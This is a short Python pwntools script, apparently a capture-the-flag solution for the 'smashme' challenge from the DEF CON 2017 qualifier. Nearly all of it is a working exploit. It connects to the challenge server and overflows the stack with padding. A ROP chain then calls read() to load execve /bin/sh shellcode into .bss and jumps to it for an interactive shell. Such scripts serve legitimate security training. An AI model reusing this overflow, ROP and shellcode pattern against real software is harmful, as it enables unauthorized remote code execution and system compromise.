# DEFCON2017 smashme

from pwn import *


#r = process('./smashme')

r = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)

raw_input()

l = r.recvuntil("Welcome to the Dr. Phil Show. Wanna smash?\n")

print l

elf = ELF('./smashme')
addr_read = elf.symbols['read']
bss = elf.bss()+0x100

log.info("[+]"+hex(addr_read))

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

pop_rsi_r15 = 0x004a02d3
pop_rdi = 0x0049c8d3

pwn = "Smash me outside, how bout dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

print hex(bss)
print hex(pop_rsi_r15)


payload = pwn + p64(pop_rsi_r15)+ p64(bss)+"aaaabbbb"+p64(pop_rdi)+p64(0)+p64(addr_read)+ p64(bss)

print payload

r.sendline(payload)

r.sendline(shellcode)

r.interactive()